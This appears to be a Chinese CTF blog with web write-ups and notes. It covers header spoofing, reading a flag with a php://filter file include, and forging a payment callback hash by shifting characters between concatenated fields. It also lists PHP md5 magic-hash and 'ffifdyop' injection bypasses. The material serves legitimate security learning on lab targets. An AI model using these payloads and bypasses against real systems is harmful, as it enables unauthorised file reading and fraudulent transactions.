<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://node5.anna.nssctf.cn:25883/ -H <span class="string">&#x27;X-Forwarded-For 127.0.0.1&#x27;</span> -H <span class="string">&#x27;Referer http://127.0.0.1/index.php&#x27;</span> -H <span class="string">&#x27;login 1&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="baby-file"><a href="#baby-file" class="headerlink" title="baby_file"></a>baby_file</h1><p>题目</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Here&#x27;s a secret. Can you find it?<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span></span><br><span class="line"><span class="language-php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>用php伪协议读取文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line">PD9waHANCkhleSBoZXksIHJlYWNoIHRoZSBoaWdoZXN0IGNpdHkgaW4gdGhlIHdvcmxkISBBY3R1YWxseSBJIGFtIGlrdW4hITsNCg0KTlNTQ1RGe2FkNWI4ZGNiLWZkMDctNDk5MS05MDJiLTYwYWFhMWRjODgyNn07DQoNCj8+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># echo PD9waHANCkhleSBoZXksIHJlYWNoIHRoZSBoaWdoZXN0IGNpdHkgaW4gdGhlIHdvcmxkISBBY3R1YWxseSBJIGFtIGlrdW4hITsNCg0KTlNTQ1RGe2FkNWI4ZGNiLWZkMDctNDk5MS05MDJiLTYwYWFhMWRjODgyNn07DQoNCj8+ | base64 -d                                </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Hey hey, reach the highest city in the world! Actually I am ikun!!;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;ad5b8dcb-fd07-<span class="number">4991</span>-<span class="number">902</span>b-<span class="number">60</span>aaa1dc8826&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure></div>

<h1 id="支付系统"><a href="#支付系统" class="headerlink" title="支付系统"></a>支付系统</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> quart <span class="keyword">import</span> Quart, render_template, redirect, jsonify, request, session</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> pbkdf2_hmac</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> IntEnum</span><br><span class="line"><span class="keyword">from</span> tortoise <span class="keyword">import</span> fields</span><br><span class="line"><span class="keyword">from</span> tortoise.models <span class="keyword">import</span> Model</span><br><span class="line"><span class="keyword">from</span> tortoise.contrib.quart <span class="keyword">import</span> register_tortoise</span><br><span class="line"><span class="keyword">from</span> httpx <span class="keyword">import</span> AsyncClient</span><br><span class="line"></span><br><span class="line">app = Quart(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransactionStatus</span>(<span class="title class_ inherited__">IntEnum</span>):</span><br><span class="line">    SUCCESS = <span class="number">0</span></span><br><span class="line">    PENDING = <span class="number">1</span></span><br><span class="line">    FAILED = <span class="number">2</span></span><br><span class="line">    TIMEOUT = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transaction</span>(<span class="title class_ inherited__">Model</span>):</span><br><span class="line">    <span class="built_in">id</span> = fields.IntField(pk=<span class="literal">True</span>)</span><br><span class="line">    user = fields.UUIDField()</span><br><span class="line">    amount = fields.IntField()</span><br><span class="line">    status = fields.IntEnumField(TransactionStatus)</span><br><span class="line">    desc = fields.TextField()</span><br><span class="line">    <span class="built_in">hash</span> = fields.CharField(<span class="number">64</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="variable language_">self</span>.__setattr__(k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">do_callback</span>(<span class="params">transaction: Transaction</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> AsyncClient() <span class="keyword">as</span> ses:</span><br><span class="line">        transaction.status = <span class="built_in">int</span>(TransactionStatus.FAILED)</span><br><span class="line">        data = (</span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.user&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.amount&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.status&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.desc&#125;</span>&#x27;</span></span><br><span class="line">        ).encode()</span><br><span class="line">        <span class="keyword">await</span> ses.post(<span class="string">f&#x27;http://localhost:8000/callback&#x27;</span>, data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: transaction.<span class="built_in">id</span>,</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: transaction.user,</span><br><span class="line">            <span class="string">&#x27;amount&#x27;</span>: transaction.amount,</span><br><span class="line">            <span class="string">&#x27;desc&#x27;</span>: transaction.desc,</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: transaction.status,</span><br><span class="line">            <span class="string">&#x27;hash&#x27;</span>: pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;uid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;uid&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    session[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> <span class="keyword">await</span> Transaction.<span class="built_in">filter</span>(user=session[<span class="string">&#x27;uid&#x27;</span>]).<span class="built_in">all</span>():</span><br><span class="line">        <span class="keyword">if</span> tr.status == TransactionStatus.SUCCESS:</span><br><span class="line">            session[<span class="string">&#x27;balance&#x27;</span>] += tr.amount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pay&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">pay</span>():</span><br><span class="line">    transaction = <span class="keyword">await</span> Transaction.create(</span><br><span class="line">        amount=request.args.get(<span class="string">&#x27;amount&#x27;</span>),</span><br><span class="line">        desc=request.args.get(<span class="string">&#x27;desc&#x27;</span>),</span><br><span class="line">        status=TransactionStatus.PENDING,</span><br><span class="line">        user=uuid.UUID(session.get(<span class="string">&#x27;uid&#x27;</span>))</span><br><span class="line">    )</span><br><span class="line">    app.add_background_task(do_callback, transaction)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">f&#x27;/transaction?id=<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/callback&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">callback</span>():</span><br><span class="line">    form = <span class="built_in">dict</span>(<span class="keyword">await</span> request.form)</span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;id&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;user&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;amount&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;status&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;desc&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">    ).encode()</span><br><span class="line">    k = pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">    tr = <span class="keyword">await</span> Transaction.get(<span class="built_in">id</span>=<span class="built_in">int</span>(form.pop(<span class="string">&#x27;id&#x27;</span>)))</span><br><span class="line">    <span class="keyword">if</span> k != form.get(<span class="string">&quot;hash&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;403&#x27;</span></span><br><span class="line">    form[<span class="string">&#x27;status&#x27;</span>] = TransactionStatus(<span class="built_in">int</span>(form.pop(<span class="string">&#x27;status&#x27;</span>)))</span><br><span class="line">    tr.update_from_dict(form)</span><br><span class="line">    <span class="keyword">await</span> tr.save()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/transaction&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">transaction</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span></span><br><span class="line">    transaction = <span class="keyword">await</span> Transaction.get(<span class="built_in">id</span>=request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> render_template(<span class="string">&#x27;receipt.html&#x27;</span>, transaction=transaction)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> render_template(</span><br><span class="line">        <span class="string">&#x27;flag.html&#x27;</span>,</span><br><span class="line">        balance=session[<span class="string">&#x27;balance&#x27;</span>],</span><br><span class="line">        flag=os.getenv(<span class="string">&#x27;FLAG&#x27;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.html&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> render_template(<span class="string">&#x27;source-highlight.html&#x27;</span>, code=f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_tortoise(</span><br><span class="line">    app,</span><br><span class="line">    db_url=<span class="string">&quot;sqlite://./data.db&quot;</span>,</span><br><span class="line">    modules=&#123;<span class="string">&quot;models&quot;</span>: [__name__]&#125;,</span><br><span class="line">    generate_schemas=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
<p>这是基于Quart的一个python系统<br>路由有<code>/pay</code> <code>/callback</code> <code>/transaction</code> <code>/flag</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"># 交易状态</span><br><span class="line"><span class="keyword">class</span> <span class="symbol">TransactionStatus</span>(<span class="symbol">IntEnum</span>):</span><br><span class="line">    <span class="symbol">SUCCESS</span> = <span class="symbol">0</span></span><br><span class="line">    <span class="symbol">PENDING</span> = <span class="symbol">1</span></span><br><span class="line">    <span class="symbol">FAILED</span> = <span class="symbol">2</span></span><br><span class="line">    <span class="symbol">TIMEOUT</span> = <span class="symbol">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><code>do_callback(transaction)</code> 发送一个 HTTP POST 请求到 <code>http://localhost:8000/callback</code>，通知交易结果。<br>    <code>pbkdf2_hmac</code> 生成加密哈希，防止数据被篡改。<br><code>@app.before_request</code>：每次请求前执行此函数<br><code>session[&#39;uid&#39;] = str(uuid.uuid4())</code>：如果用户没有 UID，生成一个新的 UUID。<br><code>session[&#39;balance&#39;] = 0</code>：初始化余额。<br><code>if tr.status == TransactionStatus.SUCCESS:</code><br>            <code>session[&#39;balance&#39;] += tr.amount</code>遍历用户的所有成功交易，并把金额累计给balance。<br>处理 <code>/pay</code> 路由：<br>&emsp;读取 amount 和 desc（从 URL 参数获取）。<br>&emsp;创建一笔交易，初始状态是 PENDING。<br>&emsp;后台执行 do_callback（用于模拟支付流程）。<br>&emsp;跳转到 &#x2F;transaction 页面，查看交易信息。<br><code>/callback</code>:<br>&emsp;用POST请求接受数据，这个路由接受参数，验证交易<br>&emsp;计算 hash，并与请求的 hash 进行对比，防止篡改。<br>&emsp;如果 hash 验证失败，返回 403。<br>&emsp;否则，更新交易状态，并保存到数据库。<br><code>/transaction</code>:<br>&emsp;根据id查询交易详情<br><code>/flag</code>:<br>&emsp;根据balance的值，如果达成某种条件就输出flag<br><br><br>最重要的是callback这个检验路由  它会把post接受的数据做一个hash来验证交易的真假，但是我们并不知道这个<code>app.secret_key</code><br>这里是通过<code>/pay</code>构造一个订单，然后发送到<code>do_callback</code>在这里data被hash加密然后用post传给<code>/callback</code><br>而且data的结构是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">data = (</span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.user&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.amount&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.status&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.desc&#125;</span>&#x27;</span></span><br><span class="line">    ).encode()</span><br></pre></td></tr></table></figure></div>

<p>这是字符串拼接的形式<br><code>/callback</code>里面接受到data进行hash检验，然后将订单的<code>status</code>修改成我们传入的值</p>
<p>所以总的思路就是构建订单，然后对data数据做更改，把status改成0（success） 让balance满足条件<br>比如现在的原始data数据是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>    user   amount   status   desc </span><br><span class="line"><span class="attribute">aaa</span>   bbb     <span class="number">1000</span>      <span class="number">2</span>       <span class="number">1234</span> </span><br></pre></td></tr></table></figure></div>

<p>我们要把status改成0而且要data的总的字符串不变  为 aaabbb100021234<br>修改之后的data为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>    user   amount   status   desc </span><br><span class="line"><span class="attribute">aaa</span>   bbb     <span class="number">100</span>      <span class="number">0</span>       <span class="number">21234</span> </span><br></pre></td></tr></table></figure></div>
<p>拼接之后还是aaabbb100021234</p>
<p>所以我们打开bp  在&#x2F;pay路由里面输入?amount&#x3D;1000&amp;desc&#x3D;1234<br>构造一个订单，获得id<br>把得到的id发送到&#x2F;transaction 里查询订单详情 ?id&#x3D;(your_id) 可以得到hash<br>然后到&#x2F;callback校验路由里面修改订单的数据 <code>id=(your_id)&amp;user=xxx&amp;amount=100&amp;status=0&amp;desc=21234&amp;hash=xxxx</code><br>返回ok说明成功修改了<br>最后访问&#x2F;flag路由，因为现在的balance已经达到要求了，所以就返回flag了</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-web笔记</title>
    <url>/posts/59777.html</url>
    <content><![CDATA[<p>个人web小白题刷题笔记</p>
<span id="more"></span>

<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><ul>
<li>在修改请求头的时候考虑加上X-Forwarded-For: 127.0.0.1<br>X-Forwarded-For（XFF）是一个HTTP请求头字段，通常用于标识客户端的真实IP地址，即使请求经过了多个代理或负载均衡服务器。<br>在流量包（网络抓包）中，<strong>Referer</strong>（有时写作 <code>Refer</code>）是 HTTP 请求头字段之一，主要用于指示当前请求是从哪个页面跳转过来的。它的作用是告诉服务器，用户是从哪个 URL 访问当前资源的。</li>
<li>浏览器内部使用 32 位带符号的整数，来储存推迟执行的时间。这意味着 setTimeout 最多只能推迟执行 2147483647 毫秒（24.8 天）超过这个时间会发生溢出。如果溢出了之后，相当于从 0 开始，整数上溢</li>
<li><code>#</code>的url编码是%23 <code>&#39;</code>的是%27 <code>\n</code>是%0a <code>\t</code>是%09 </li>
<li>在 PHP 中，<code>$_REQUEST</code> 是一个超全局变量，用于获取通过多种方式（如 <code>GET</code>、<code>POST</code>、<code>COOKIE</code>）发送到脚本的数据。</li>
<li><code>alert()</code>函数可以再控制台调用</li>
</ul>
<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul>
<li>md5相同但是字符串不同：<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) = <span class="number">0</span>e462097431906509019562988736854</span><br><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) = <span class="number">0</span>e830400451993494058024219903391</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabg7XSs&#x27;</span>)</span></span> = <span class="number">0</span>e087386482136013740957780965295</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabC9RqS&#x27;</span>)</span></span> = <span class="number">0</span>e260421314791580664869894734725</span><br><span class="line">   <span class="number">314282422</span>    QLTHNDT   EEIZDOI</span><br></pre></td></tr></table></figure></div></li>
<li>md5($str, false) 这是md5的默认情况 返回32位16进制数   如果是 md5($str, true)就返回16位二进制数<br>ffifdyop 是true参数时候的漏洞  md5 (‘ffifdyop’,true)&#x3D;’or’6xxxxxx 也就是or了一个true</li>
<li>在 PHP 中，如果 <code>md5()</code> 作用于一个<strong>数组</strong>，它不会计算哈希，而是返回 <code>NULL</code>，但<strong>不会报错</strong>（因为 <code>error_reporting(0);</code> 关闭了错误输出）。<br>  所以可以用数组来绕过md5验证  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">用到场景：</span><br><span class="line">$a !== $b &amp;&amp; md5($a) === md5($b)</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>运算符</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>!=</code></td>
<td><strong>不等于</strong>（只比较值，允许类型转换）</td>
</tr>
<tr>
<td><code>!==</code></td>
<td><strong>全不等</strong>（值或类型不同都算不等）</td>
</tr>
</tbody></table>
</li>
<li><code>$md5[0]==md5($md5[0])</code> 绕过可以使用 <code>0e215962017</code>，因为这个值的md5也是0e开头的</li>
</ul>
<h2 id="php知识"><a href="#php知识" class="headerlink" title="php知识"></a>php知识</h2><ul>
<li><p>php函数<code>glob(&#39;*&#39;);</code>查看当前目录中的文件 配合 <code>highlight_file(&#39;$filename&#39;)</code>查看</p>
</li>
<li><p>php中<code>&lt;?php</code>等价于<code>&lt;?=</code> 可以减少字符数</p>
</li>
<li><p>在 php 中，使用 <code>Content-Type: multipart/form-data;</code> 上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code> 参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code>。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 phpXXXX.tmp（Windows 中）、php**.tmp（Linux 中）。我们可以发送一个上传文件的 post 包，此时 php 会将我们上传的文件保存在临时文件夹下，默认的文件名是 &#x2F;tmp&#x2F;phpxxxxxx，文件名最后 6 个字符是随机的大小写字母。如 &#x2F;tmp&#x2F;php123abc</p>
</li>
<li><p><code>forward_static_call_array()</code> 是 PHP 中的一个内置函数，它允许在运行时动态地调用一个静态方法。其作用类似于 <code>call_user_func_array()</code>，但专门用于静态方法调用</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">forward_static_call_array([&#x27;类名&#x27;, &#x27;静态方法名&#x27;], 参数数组);</span><br><span class="line">forward_static_call_array( callable $function ,<span class="built_in"> array </span>$parameters )</span><br></pre></td></tr></table></figure></div>
<p>&emsp;与 <code>call_user_func_array()</code> 的区别:<code>call_user_func_array()</code> 也可以用于调用静态方法：但 <code>forward_static_call_array()</code> 主要用于静态上下文，特别是在继承场景下，确保调用的是当前类或子类的方法，而不是基类的方法。<br>在 PHP 中，默认命名空间为 <code>\</code>，因此调用静态方法时可以使用<strong>绝对路径</strong>：</p>
</li>
<li><p>在 php 当中默认命名空间是 \，所有原生函数和类都在这个命名空间中。<br>普通调用一个函数，如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路径；<br>而如果写 \function_name () 这样调用函数，则其实是写了一个绝对路径。如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法。<br>举例：</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyNamespace</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strlen</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Custom strlen function in MyNamespace&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello, World!&quot;</span>);  <span class="comment">// 调用的是当前命名空间中的 strlen()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果你想调用 PHP 原生的 strlen 函数，应该使用绝对路径</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="title function_ invoke__">strlen</span>(<span class="string">&quot;Hello, World!&quot;</span>);  <span class="comment">// 调用全局的 strlen()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li><p>PHP 中的 <code>call_user_func()</code>函数：<br>call_user_func() 是 PHP 的一个回调函数调用方法，它可以用于 动态调用函数 或 类的方法，即在运行时决定要执行哪个函数，而不是在代码编写时就固定。</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    static function sayHello(<span class="variable">$name</span>) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="variable">$name</span>!&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">echo call_user_func([<span class="string">&quot;Demo&quot;</span>, <span class="string">&quot;sayHello&quot;</span>], <span class="string">&quot;Alice&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>php伪协议：</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">1）<span class="keyword">file</span>:<span class="comment">// 访问本地文件系统</span></span><br><span class="line">2）http:<span class="comment">// 访问 HTTP (S) 网址</span></span><br><span class="line">3）ftp:<span class="comment">// 访问 FTP (S) URL</span></span><br><span class="line">4) php:<span class="comment">// 访问各个输出输入流</span></span><br><span class="line">5) zlib:<span class="comment">// 处理压缩流</span></span><br><span class="line">6) data:<span class="comment">// 读取数据</span></span><br><span class="line">7) <span class="keyword">glob</span>:<span class="comment">// 查找匹配的文件路径模式</span></span><br><span class="line">8) phar:<span class="comment">// PHP 归档</span></span><br><span class="line">9) rar:<span class="comment">// RAR 数据压缩</span></span><br></pre></td></tr></table></figure></div>
<p>用data伪协议也可以读文件data:&#x2F;&#x2F;text&#x2F;plain;base64,<code>[base64]</code></p>
</li>
<li><p><code>file_get_contents()</code> 是 PHP 读取文件内容的函数，它可以：</p>
</li>
</ul>
<p>&emsp;读取本地文件 (<code>file://</code>)<br>&emsp;读取远程文件 (<code>http://</code> &#x2F; <code>https://</code>)<br>&emsp;读取特殊流 (<code>php://input</code>, <code>data://</code> 等)<br>&emsp;读取压缩文件 (<code>compress.zlib://</code>)<br> <mark><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的</marked></p>
<ul>
<li><code>data://</code> 伪协议允许在 URL 直接存储数据，而不需要实际文件。</li>
<li><code>intval()</code> 是 PHP 的一个函数，它用于将变量转换为整数（integer）。它的基本用法如下：  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>): <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span>（必需）：要转换的值，可以是字符串、浮点数、布尔值等。</span><br><span class="line"><span class="variable">$base</span>（可选）：进制，默认为 <span class="number">10</span>。仅当 <span class="variable">$value</span> 是字符串时有效，可用于转换不同进制的数字（如二进制、十六进制）。</span><br></pre></td></tr></table></figure></div>
